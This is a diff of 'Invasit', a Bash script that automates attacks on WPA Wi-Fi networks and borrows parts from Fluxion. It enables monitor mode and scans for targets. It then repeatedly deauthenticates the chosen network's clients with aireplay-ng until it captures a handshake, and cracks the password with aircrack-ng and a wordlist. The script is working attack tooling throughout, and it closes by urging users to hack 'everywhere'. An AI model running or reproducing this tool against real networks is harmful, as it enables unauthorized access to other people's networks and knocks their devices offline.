@@ -3,6 +3,7 @@
 # Invasit version 1 || by: valvesss
 
 ###################### PRE-CHECKS ############################
+## From Fluxion
 
 if [[ $EUID -ne 0 ]]; then
         echo -e "\e[You don't have admin privilegies, execute the script as root.""\e[0m"""
@@ -13,13 +14,36 @@ if [ -z "${DISPLAY:-}" ]; then
     echo -e "\e[The script should be exected inside a X (graphical) session.""\e[0m"""
     exit 1
 fi
-###################### SHORTCUTS #############################
+################## SHORTCUTS/STUFFS ##########################
 
-airodump1='xterm -title FIND_YOUR_TARGET -e airodump-ng --encrypt WPA $nic -w target -o csv'
-airodump2='xterm -title $name -e airodump-ng --bssid $bssidtarget -c $channel,$channel -w $name -o csv $nic'
-airodump3='xterm -title $name -e airodump-ng -d $bssidtarget -c $channel,$channel -w $name -o cap $nic &'
-aireplay1='xterm -title $name -e aireplay-ng -0 20 -a $bssidtarget -c $bssidclient --ignore-negative-one $nic'
+# Air family
+deauthtime=15
+function airodumpall {
+	xterm -title "FIND YOUR TARGET" -e airodump-ng --encrypt WPA $nic -w target -o kismet
+}
+
+function airodumpgetclients {
+	xterm -title "SCANNING $networkname CLIENTS " $TOPLEFT -e airodump-ng -a --bssid $bssidtarget -c $channel,$channel -w $name -o csv $nic &
+}
+
+function airodumptarget {
+	xterm -title "ATTACKING $networkname NETWORK" $TOPRIGHTBIG -e airodump-ng -a --bssid $bssidtarget -c $channel,$channel -w $name -o cap $nic &
+}
+
+function deauthesp {
+	xterm -title "Deauth" $BOTTOMRIGHT -e aireplay-ng -0 $deauthtime -a $bssidtarget -c $bssidclient --ignore-negative-one $nic
+}
+
+function killeverybody {
+# Kill air & xterm processes useless
+	killall aireplay-ng &>/dev/null
+	killall airodump-ng &>/dev/null
+	killall xterm &>/dev/null			
+}
+# Time for most functions
 st='0.2'
+
+# Colors for echo
 RED='\033[0;31m'
 YELLOW='\033[1;33m'
 BLUE='\033[0;34m'
@@ -27,8 +51,8 @@ GREEN='\033[0;32m'
 WHITE='\033[1;37m'
 NC='\033[0m'
 
-baseline="$USER@`hostname`:`pwd`#"
-userpath="echo -n $baseline"
+# user @ machine # shortchut
+userpath="echo -n -e `whoami`@`hostname`:`pwd`#\t\b"
 
 # Precautions
 trap ctrl_c INT
@@ -37,6 +61,7 @@ function ctrl_c(){
 }
 
 ##################### SYSTEM REQUIREMENTS ####################
+## From Fluxion
 function systemrequirements {
 	clear
 	echo -e "	Checking system requirements...\n"
@@ -99,8 +124,87 @@ function systemrequirements {
         fi
 	echo -e "\nSystem ready!"
 	sleep $st
-	INTRO
+	setresolution
 }
+
+################# WINDOWS + RESOLUTIONS #####################
+## From Fluxion
+
+# Windows + Resolution
+function setresolution {
+
+        function resA {
+
+                TOPLEFT="-geometry 90x13+0+0"
+                TOPRIGHT="-geometry 83x26-0+0"
+                BOTTOMLEFT="-geometry 90x24+0-0"
+                BOTTOMRIGHT="-geometry 75x12-0-0"
+                TOPLEFTBIG="-geometry 91x42+0+0"
+                TOPRIGHTBIG="-geometry 83x26-0+0"
+        }
+
+        function resB {
+
+                TOPLEFT="-geometry 92x14+0+0"
+                TOPRIGHT="-geometry 68x25-0+0"
+                BOTTOMLEFT="-geometry 92x36+0-0"
+                BOTTOMRIGHT="-geometry 74x20-0-0"
+                TOPLEFTBIG="-geometry 100x52+0+0"
+                TOPRIGHTBIG="-geometry 74x30-0+0"
+        }
+        function resC {
+
+                TOPLEFT="-geometry 100x20+0+0"
+                TOPRIGHT="-geometry 109x20-0+0"
+                BOTTOMLEFT="-geometry 100x30+0-0"
+                BOTTOMRIGHT="-geometry 109x20-0-0"
+                TOPLEFTBIG="-geometry  100x52+0+0"
+                TOPRIGHTBIG="-geometry 109x30-0+0"
+        }
+        function resD {
+                TOPLEFT="-geometry 110x35+0+0"
+                TOPRIGHT="-geometry 99x40-0+0"
+                BOTTOMLEFT="-geometry 110x35+0-0"
+                BOTTOMRIGHT="-geometry 99x30-0-0"
+                TOPLEFTBIG="-geometry 110x72+0+0"
+                TOPRIGHTBIG="-geometry 99x40-0+0"
+        }
+        function resE {
+                TOPLEFT="-geometry 130x43+0+0"
+                TOPRIGHT="-geometry 68x25-0+0"
+                BOTTOMLEFT="-geometry 130x40+0-0"
+                BOTTOMRIGHT="-geometry 132x35-0-0"
+                TOPLEFTBIG="-geometry 130x85+0+0"
+                TOPRIGHTBIG="-geometry 132x48-0+0"
+        }
+        function resF {
+                TOPLEFT="-geometry 100x17+0+0"
+                TOPRIGHT="-geometry 90x27-0+0"
+                BOTTOMLEFT="-geometry 100x30+0-0"
+                BOTTOMRIGHT="-geometry 90x20-0-0"
+                TOPLEFTBIG="-geometry  100x70+0+0"
+                TOPRIGHTBIG="-geometry 90x27-0+0"
+	}
+
+detectedresolution=$(xdpyinfo | grep -A 3 "screen #0" | grep dimensions | tr -s " " | cut -d" " -f 3)
+##  A) 1024x600
+##  B) 1024x768
+##  C) 1280x768
+##  D) 1280x1024
+##  E) 1600x1200
+case $detectedresolution in
+        "1024x600" ) resA ;;
+        "1024x768" ) resB ;;
+        "1280x768" ) resC ;;
+        "1366x768" ) resC ;;
+        "1280x1024" ) resD ;;
+        "1600x1200" ) resE ;;
+        "1366x768"  ) resF ;;
+                  * ) resA ;;
+esac
+INTRO
+}
+
 
 ######################### START ##############################
 
@@ -131,22 +235,108 @@ MONMODE
 
 # 1) Create NIC mon0
 function MONMODE {
+# Kill all process the could couse trouble to aircrack family
+airmon-ng check kill &> /dev/null &
 nic=mon0
-iwconfig > nic.txt 2> /dev/null
-nicreal=$(cat nic.txt | awk 'NR==1{print $1}')
-rm -rf nic.txt
-echo 
-if `iwconfig 2> /dev/null | awk '{print $1}' | grep -q $nic`; then
-	WORDLIST
+nicreal=$(iwconfig 2> /dev/null | awk 'NR==1{print $1}')
+if `iw dev | grep -q $nic`; then
+	ifconfig mon0 up 2> /dev/null
+	GERTAB
 else
 	iw dev $nicreal interface add $nic type monitor 2> /dev/null
-	WORDLIST
+	ifconfig mon0 up 2> /dev/null
+	GERTAB
 fi
 }
 
-# 2) Search wordlist and verify if don't exist
+# 2) Generate table with all WPA networks found
+function GERTAB {
+echo -e "\n# 1) When you find the target network, press CTRL+C.  #"
+airodumpall
+name=target
+EDTCHN
+}
+
+# 3) Edit airodump output in a human readable way and choose network
+function EDTCHN {
+if [ ! -f $name-01.kismet.csv ]; then
+	echo -e "\n# File not found, rescaning... #"
+	rm -rf $name*.kismet.csv
+	airodumpall
+fi
+echo -e "\n# 2) Select the network you want to attack [1,2,3...N]: #\n"
+# Output edit
+cat target-01.kismet.csv | cut -d ';' -f1,4,6,22 | sed 's/;/ /g' | sed 's/BestQuality/-dB/g'| column -t > auxfile1
+cat target-01.kismet.csv | cut -d ';' -f3 > auxfile2
+# Choose network
+paste -d " " auxfile1 /dev/null auxfile2 > auxfile3
+echo "-------------------------------------------------------------------"
+cat auxfile3
+echo "^------------------------------------------------------------------"
+read num
+let num=num+1
+# Based on users option, get the host: mac, channel and name.
+bssidtarget=$(cat auxfile3 | awk -v aux=$num 'NR==aux {print $2}')
+channel=$(cat auxfile3 | awk -v aux=$num 'NR==aux {print $3}')
+networkname=$(cat auxfile3 | awk -v aux=$num 'NR==aux' | tr -s ' ' | cut -d ' ' -f5-8 | tr -d "[:blank:]")
+rm -rf auxfile*
+rm -rf $name-01.kismet.csv
+name=$networkname"_"$bssidtarget
+# Start airodump at the target 
+ESPSCN
+}
+
+# 4) Scan especific network to get clients
+function ESPSCN {
+airodumpgetclients
+echo "Getting mac clients..."
+airodumpgetclientsPID=$!
+sleep 5
+mac=$name.lst
+nr=0
+while [ $nr = 0 ]; do
+cat $name-01.csv | awk 'NR==6,NR==10' | awk '{print $1}' | sed 's/,//g' | sed '/^\s*$/d' > $mac	
+nr=$(cat $mac | wc -l)
+done
+SCAHAN
+}
+
+# 5) Scan network to capture the HANDSHAKE
+function SCAHAN {
+# Start scanning network target
+rm -rf $name-01.csv
+airodumptarget
+kill $airodumpgetclientsPID &> /dev/null
+echo -e "\n# 4) Scanning $networkname to get the HANDSHAKE. #"
+ATTAIR
+}
+
+# 6) Attack using aireplay-ng
+function ATTAIR {
+# Attack clients host until find handshake packet
+i=1
+	while [ $i -le $nr ]; do
+		bssidclient=$(awk -v var=$i 'NR==var' $mac)
+		deauthesp
+		sleep 1
+		let i=i+1
+	done
+		# If handshake corrupted or with no password
+		if `aircrack-ng $name-01.cap | egrep -q '0 handshake|0 packets|No networks'` ; then
+			echo -e "\n# Handshake packet not found in .cap file, trying again... #"
+			sleep 2
+			ATTAIR
+		fi
+# Finish useless process
+killeverybody
+# Delete MAC clients table if all right
+rm -rf $mac
+WORDLIST
+}
+
+# 7) Search wordlist and verify if don't exist
 function WORDLIST {
-echo -e "\n# 1) Type the wordlist full path: #" 
+echo -e "\n# 5) Type the wordlist full path: #" 
 $userpath
 read path
 a=0
@@ -160,140 +350,27 @@ do
 		a=1
 	fi
 done
-GERTAB
-}
-
-# 3) Generate table with all WPA networks found
-function GERTAB {
-echo -e "\n# 2) When you find the target network, press CTRL+C.  #"
-eval $airodump1
-name=target
-COMDAD
-}
-
-# 4) Edit airodump output in a human readable way
-function COMDAD {
-if [ ! -f $name-01.csv ]; then
-	echo -e "\n# CSV not found, rescan? [y/n] #"
-	read rescan
-	if [ $rescan = "y" ] || [ $rescan = "Y" ]; then
-		rm -rf $name-01.csv
-		eval $airodump1
-	fi
-fi
-echo -e "\n# 3) Select the network you want to attack: #\n"
-cat $name-01.csv | cut -d ',' -f 1,4,14,9 | sed '/Station MAC/,$d' | sed '/^\s*$/d' | sed 's/,//g' | tail -n +2 | nl | awk '{print $1,$5,$2,$3,$4}' | column -t | sed '/ESSID/G' > $name.txt
-echo "-------------------------------------------"
-cat $name.txt
-echo "^------------------------------------------"
-read num
-bssidtarget=$(cat $name.txt | awk -v aux=$num 'NR==aux {print $3}')
-channel=$(cat $name.txt | awk -v aux=$num 'NR==aux {print $4}')
-networkname=$(cat $name.txt | awk -v aux=$num 'NR==aux {print $2}')
-rm -rf $name.txt
-mv $name-01.csv $networkname-01.csv
-name=$networkname
-GERDAD
-}
-
-# 5) Gera dados para capturar o BSSID dos clientes
-function GERDAD {
-echo -e "\n# 4) Wait to list 2 or more client above STATION column and press CTRL+C. #"
-eval $airodump2
-aux=1
-	while [ $aux = 1 ]; do
-		echo -e "\n# Try again? [0/1] / Change Network? [c] #"
-		read aux
-			if [ $aux = 1 ]; then
-				rm -rf $name-01.csv
-			elif [ $aux = "c" ] || [ $aux = "C" ]; then
-				rm -rf $name-02.csv
-				eval $airodump1
-					COMDAD
-			elif [ $aux != 1 ] && [ $aux != 0 ]; then
-				echo "Invalid option, try again."
-				aux=1
-			fi
-	done
-mac=$name.lst
-cat $name-02.csv | awk 'NR==6,NR==10' | awk '{print $1}' | sed 's/,//g' | sed '/^\s*$/d' > $mac
-rm -rf $name-02.csv
-SCAN
-}
-
-# 6) Scan the specific network
-function SCAN {
-echo -e "\n# Scanning for $networkname HANDSHAKE #"
-eval $airodump3
-HANDSHAKE
-}
-
-# 7) Start the handshake capture
-function HANDSHAKE {
-rm -rf $name-01.csv
-nr=$(cat $mac | wc -l)
-i=1
-while [ $i -le $nr ]; do
-	bssidclient=$(awk -v var=$i 'NR==var' $mac)
-	eval $aireplay1
-	let i=i+1
-done
 AIRCRACK
 }
 
 # 8) Decryptograph the password
 function AIRCRACK {
-sleep 5
-a=0
-while [ $a -eq 0  ]
-do
-		if [ ! -f $name-01.cap ]; then
-			b=0
-			while [ $b -le 3 ]
-			do
-				echo -e "\n# .cap not found, reescaning. #"
-				sleep 5
-				SCAN
-				let b=b+1
-			done
-		fi
-	if aircrack-ng $name-01.cap | egrep '0 handshake|0 packets|No networks' &> /dev/null; then
-		echo -e "\n# Handshake packet not found in .cap file, try again? [y/n] / Continue [c] #"
-		read wish
-		if [ $wish = "y" ] || [ $wish = "Y" ]; then
-			HANDSHAKE
-		elif [ $wish = "n" ] || [ $wish = "N" ]; then
-			END
-			exit;
-		elif [ $aux = "c" ] || [ $aux = "C" ]; then
-			a=1
-		fi
-	fi
-	a=1
-done
-rm -rf $mac
-kill $(ps aux | grep 'xterm' | awk '{print $2}') &> /dev/null
+# Clean handshake packet
 wpaclean $name-clean.cap $name-01.cap &> /dev/null
-aircrack-ng $name-clean.cap -w $path
-echo "Press Enter to continue..."
+rm -rf $name-01.cap
+# Start the wordlist method attack
+aircrack-ng $name-clean.cap -w $path 2>/dev/null
+echo "To finish, press ENTER..."
 read enter
 END
 }
 
 # 9) Reinicialize network services and delete the nic created
 function END {
-iwconfig 2> /dev/null | grep Monitor > monitor.txt &> /dev/null
-sleep $st
-clear
 echo "[+] Deleting network card if created..."
-	if cat monitor.txt | awk '{print $1}' &> /dev/null ; then
-		iw dev $nic del &> /dev/null
-	fi
-rm -rf monitor.txt &> /dev/null
-sleep $st
-echo "[+] Deleting jerk files..."
-rm -rf $name-01.csv &> /dev/null
-rm -rf $name-01.cap &> /dev/null
+if iwconfig 2> /dev/null | grep Monitor &>/dev/null; then
+	iw dev $nic del
+fi
 sleep $st
 echo "[+] Restarting network services..."
 service NetworkManager restart
@@ -301,9 +378,8 @@ service networking restart
 sleep $st
 echo "[+] Thanks for using!"
 sleep $st
-echo ""
-echo "############################################################"
-echo -e "##	${YELLOW}ENJOY THE HACKING, I N V A S I T EVERYWHERE${NC}	  ##"
+echo -e "\n############################################################"
+echo -e "##	${RED}ENJOY THE HACKING, I N V A S I T EVERYWHERE${NC}	  ##"
 echo "############################################################"
 exit
 }
